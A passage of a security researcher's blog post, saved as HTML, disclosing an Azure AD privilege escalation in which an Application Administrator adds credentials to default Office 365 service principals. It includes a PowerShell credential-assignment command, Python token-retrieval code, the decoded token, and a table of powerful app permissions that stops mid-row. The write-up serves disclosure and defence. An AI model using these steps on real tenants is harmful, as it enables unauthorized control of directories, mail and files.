@@ -1,0 +1,575 @@
+<html lang="en" class="js fontawesome-i2svg-active fontawesome-i2svg-complete"><head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Azure AD privilege escalation - Taking over default application permissions as Application Admin - dirkjanm.io</title>
+<meta name="description" content="During both my DEF CON and Troopers talks I mentioned a vulnerability that existed in Azure AD where an Application Admin or a compromised On-Premise Sync Account could escalate privileges by assigning credentials to applications. When revisiting this topic I found out the vulnerability was actually not fixed by Microsoft, and that there are still methods to escalate privileges using default Office 365 applications. In this blog I explain the why and how. The escalation is still possible since this behaviour is considered to be “by-design” and thus remains a risk.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="dirkjanm.io">
+<meta property="og:title" content="Azure AD privilege escalation - Taking over default application permissions as Application Admin">
+<meta property="og:url" content="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">
+
+
+  <meta property="og:description" content="During both my DEF CON and Troopers talks I mentioned a vulnerability that existed in Azure AD where an Application Admin or a compromised On-Premise Sync Account could escalate privileges by assigning credentials to applications. When revisiting this topic I found out the vulnerability was actually not fixed by Microsoft, and that there are still methods to escalate privileges using default Office 365 applications. In this blog I explain the why and how. The escalation is still possible since this behaviour is considered to be “by-design” and thus remains a risk.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2019-09-16T19:08:57+00:00">
+
+
+
+
+
+
+<style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="canonical" href="https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="dirkjanm.io Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    
+  <style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+
+  <body class="layout--single wide" style="margin-bottom: 229.767px;">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">dirkjanm.io</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/talks/">Presentations</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button" style="" count="0">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope="" itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/img/thisisapicture.png" alt="Dirk-jan Mollema" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Dirk-jan Mollema</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Hacker, red teamer, researcher. Likes to write infosec-focussed Python tools. This is my personal blog containing research on topics I find interesting, such as (Azure) Active Directory internals, protocols and vulnerabilities.<br><br>Looking for a security test or training? Business contact via <a href="https://outsidersecurity.nl">outsidersecurity.nl</a>
+
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope="" itemtype="http://schema.org/Place">
+          <svg class="svg-inline--fa fa-map-marker-alt fa-w-12 fa-fw" aria-hidden="true" data-prefix="fas" data-icon="map-marker-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" data-fa-i2svg=""><path fill="currentColor" d="M172.268 501.67C26.97 291.031 0 269.413 0 192 0 85.961 85.961 0 192 0s192 85.961 192 192c0 77.413-26.97 99.031-172.268 309.67-9.535 13.774-29.93 13.773-39.464 0zM192 272c44.183 0 80-35.817 80-80s-35.817-80-80-80-80 35.817-80 80 35.817 80 80 80z"></path></svg><!-- <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> --> <span itemprop="name">Both sides of a security boundary</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/_dirkjan" itemprop="sameAs">
+            <svg class="svg-inline--fa fa-twitter-square fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg><!-- <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> --> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/dirkjanm" itemprop="sameAs">
+            <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-fw fa-github" aria-hidden="true"></i> --> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        
+          <li>
+            <a href="https://www.youtube.com/c/dirkjanm" itemprop="sameAs">
+              <svg class="svg-inline--fa fa-youtube fa-w-18 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="youtube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" data-fa-i2svg=""><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg><!-- <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> --> YouTube
+            </a>
+          </li>
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope="" itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Azure AD privilege escalation - Taking over default application permissions as Application Admin">
+    <meta itemprop="description" content="During both my DEF CON and Troopers talks I mentioned a vulnerability that existed in Azure AD where an Application Admin or a compromised On-Premise Sync Account could escalate privileges by assigning credentials to applications. When revisiting this topic I found out the vulnerability was actually not fixed by Microsoft, and that there are still methods to escalate privileges using default Office 365 applications. In this blog I explain the why and how. The escalation is still possible since this behaviour is considered to be “by-design” and thus remains a risk.">
+    <meta itemprop="datePublished" content="September 16, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Azure AD privilege escalation - Taking over default application permissions as Application Admin
+</h1>
+          
+            <p class="page__meta"><svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" data-prefix="far" data-icon="clock" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg><!-- <i class="far fa-clock" aria-hidden="true"></i> --> 
+
+
+
+
+  5 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>During both my DEF CON and Troopers <a href="/talks/">talks</a> I mentioned a vulnerability that existed in Azure AD where an Application Admin or a compromised On-Premise Sync Account could escalate privileges by assigning credentials to applications. When revisiting this topic I found out the vulnerability was actually not fixed by Microsoft, and that there are still methods to escalate privileges using default Office 365 applications. In this blog I explain the why and how. The escalation is still possible since this behaviour is considered to be “by-design” and thus remains a risk.</p>
+
+<h1 id="applications-and-service-principals">Applications and Service Principals</h1>
+<p>In Azure AD there is a distinction between Applications and Service Principals. An application is the configuration of an application, whereas the Service Principal is the security object that can actually have privileges in the Azure Directory. This can be quite confusing as in the documentation they are usually both called applications. The Azure portal makes it even more confusing by calling Service Principals “Enterprise Applications” and hiding most properties of the service principals from view. For Office 365 and other Microsoft applications, the Application definition is present in one of Microsoft’s dedicated Azure directories. In an Office 365 tenant, service principals are created for these applications automatically, giving an Office 365 Azure AD about 200 service principals by default that all have different pre-assigned permissions.</p>
+
+<h1 id="application-roles">Application roles</h1>
+<p>The way Azure AD applications work is that they can define roles, which can then be assigned to users, groups or service principals. If you read the documentation for the <a href="https://docs.microsoft.com/en-us/graph/permissions-reference">Microsoft Graph permissions</a> you can see permissions such as <code class="language-plaintext highlighter-rouge">Directory.Read.All</code>. These are actually roles defined in the Microsoft Graph application, which can be assigned to service principals. In the documentation and Azure Portal, these roles are called “Application permissions”, but we’re sticking to the API terminology here. The roles defined in the Microsoft graph application can be queried using the AzureAD PowerShell module:</p>
+
+<p><img src="/assets/img/azuread/msgraphroles.png" alt="Microsoft Graph roles"></p>
+
+<p>When we try to query for applications that have been assigned one or more roles, we can see that in my test directory the <code class="language-plaintext highlighter-rouge">appadmintest</code> app has a few roles assigned (though it’s not exactly clear what roles that are since there’s a lot of GUID references):</p>
+
+<p><img src="/assets/img/azuread/msgraphapproleassignments.png" alt="Role assignments"></p>
+
+<p>There is however no way to query within an Azure AD which roles have been assigned to default Microsoft applications. So to enumerate this we have to get a bit creative. An Application Administrator (or the On-premise Sync account if you are escalating from on-premise to the cloud) can assign credentials to an application, after which this application can log in using the <strong>client credential grant</strong> OAuth2 flow. Assigning credentials is possible using PowerShell:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$sp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-AzureADServicePrincipal</span><span class="w"> </span><span class="nt">-searchstring</span><span class="w"> </span><span class="s2">"Microsoft StaffHub"</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">New-AzureADServicePrincipalPasswordCredential</span><span class="w"> </span><span class="nt">-objectid</span><span class="w"> </span><span class="nv">$sp</span><span class="o">.</span><span class="nf">ObjectId</span><span class="w"> </span><span class="nt">-EndDate</span><span class="w"> </span><span class="s2">"31-12-2099 12:00:00"</span><span class="w"> </span><span class="nt">-StartDate</span><span class="w"> </span><span class="s2">"6-8-2018 13:37:00"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">redactedpassword</span><span class="w">
+
+
+</span><span class="n">CustomKeyIdentifier</span><span class="w"> </span><span class="p">:</span><span class="w">
+</span><span class="n">EndDate</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">31-12-2099</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w">
+</span><span class="n">KeyId</span><span class="w">               </span><span class="p">:</span><span class="w">
+</span><span class="n">StartDate</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">6-8-2018</span><span class="w"> </span><span class="nx">13:37:00</span><span class="w">
+</span><span class="n">Value</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">redactedpassword</span><span class="w">
+</span></code></pre></div></div>
+
+<p>After which we can log in using some python code and have a look at the issued access token. This JWT displays the roles the application has in the Microsoft Graph:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">jwt</span>
+<span class="kn">import</span> <span class="nn">pprint</span>
+
+<span class="c1"># This should include the tenant name/id
+</span><span class="n">AUTHORITY_URL</span> <span class="o">=</span> <span class="s">'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'</span>
+<span class="n">TOKEN_ENDPOINT</span> <span class="o">=</span> <span class="s">'/oauth2/token'</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'client_id'</span><span class="p">:</span><span class="s">'aa580612-c342-4ace-9055-8edee43ccb89'</span><span class="p">,</span>
+        <span class="s">'resource'</span><span class="p">:</span><span class="s">'https://graph.microsoft.com'</span><span class="p">,</span>
+        <span class="s">'client_secret'</span><span class="p">:</span><span class="s">'redactedpassword'</span><span class="p">,</span>
+        <span class="s">'grant_type'</span><span class="p">:</span><span class="s">'client_credentials'</span><span class="p">}</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">AUTHORITY_URL</span> <span class="o">+</span> <span class="n">TOKEN_ENDPOINT</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">data2</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">jwtdata</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">data2</span><span class="p">[</span><span class="s">'access_token'</span><span class="p">],</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+    <span class="n">pprint</span><span class="p">.</span><span class="n">pprint</span><span class="p">(</span><span class="n">jwtdata</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">KeyError</span><span class="p">:</span>
+    <span class="k">pass</span>
+</code></pre></div></div>
+
+<p>This will print the data from the token, containing the “Roles” field:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+ </span><span class="nl">"aio"</span><span class="p">:</span><span class="w"> </span><span class="s2">"42FgYJg946pl8aLnJXPOnn4zTe/mBwA="</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"app_displayname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Microsoft StaffHub"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"appid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aa580612-c342-4ace-9055-8edee43ccb89"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"appidacr"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"aud"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://graph.microsoft.com"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"exp"</span><span class="p">:</span><span class="w"> </span><span class="mi">1567200473</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"iat"</span><span class="p">:</span><span class="w"> </span><span class="mi">1567171373</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"idp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"iss"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"nbf"</span><span class="p">:</span><span class="w"> </span><span class="mi">1567171373</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"oid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"56748bde-f24d-4a5b-aa2d-c88b175dfc80"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"roles"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"Directory.ReadWrite.All"</span><span class="p">,</span><span class="w">
+           </span><span class="s2">"Mail.Read"</span><span class="p">,</span><span class="w">
+           </span><span class="s2">"Group.Read.All"</span><span class="p">,</span><span class="w">
+           </span><span class="s2">"Files.Read.All"</span><span class="p">,</span><span class="w">
+           </span><span class="s2">"Group.ReadWrite.All"</span><span class="p">],</span><span class="w">
+ </span><span class="nl">"sub"</span><span class="p">:</span><span class="w"> </span><span class="s2">"56748bde-f24d-4a5b-aa2d-c88b175dfc80"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"tid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"50ad18e1-bb23-4466-9154-bc92e7fe3fbb"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"uti"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2GScBJopwk2e3EFce7pgAA"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"ver"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.0"</span><span class="p">,</span><span class="w">
+ </span><span class="nl">"xms_tcdt"</span><span class="p">:</span><span class="w"> </span><span class="mi">1559139940</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This method only seemed to work for the Microsoft Graph (and not for the Azure AD graph). I am unsure if this is because no apps have permissions on the Azure AD graph or if the system used for these permissions is different.</p>
+
+<p>If we perform this action for all ~200 default apps in an Office 365 tenant, we get an overview of all the permissions these applications have. Below is an overview of the most interesting permissions that I’ve identified.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Application name</th>
+      <th>AppId</th>
+      <th>Access</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Microsoft Forms</td>
+      <td>c9a559d2-7aab-4f13-a6ed-e7e9c52aec87</td>
+      <td><strong>Sites.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Forms</td>
+      <td>c9a559d2-7aab-4f13-a6ed-e7e9c52aec87</td>
+      <td><strong>Files.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Cloud App Security</td>
+      <td>05a65629-4c1b-48c1-a78b-804c4abdd4af</td>
+      <td><strong>Sites.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Cloud App Security</td>
+      <td>05a65629-4c1b-48c1-a78b-804c4abdd4af</td>
+      <td><strong>Sites.FullControl.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Cloud App Security</td>
+      <td>05a65629-4c1b-48c1-a78b-804c4abdd4af</td>
+      <td><strong>Files.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Cloud App Security</td>
+      <td>05a65629-4c1b-48c1-a78b-804c4abdd4af</td>
+      <td><strong>Group.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Cloud App Security</td>
+      <td>05a65629-4c1b-48c1-a78b-804c4abdd4af</td>
+      <td><strong>User.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Cloud App Security</td>
+      <td>05a65629-4c1b-48c1-a78b-804c4abdd4af</td>
+      <td><strong>IdentityRiskyUser.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Teams</td>
+      <td>1fec8e78-bce4-4aaf-ab1b-5451cc387264</td>
+      <td><strong>Sites.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft StaffHub</td>
+      <td>aa580612-c342-4ace-9055-8edee43ccb89</td>
+      <td><strong>Directory.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft StaffHub</td>
+      <td>aa580612-c342-4ace-9055-8edee43ccb89</td>
+      <td><strong>Group.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft.Azure.SyncFabric</td>
+      <td>00000014-0000-0000-c000-000000000000</td>
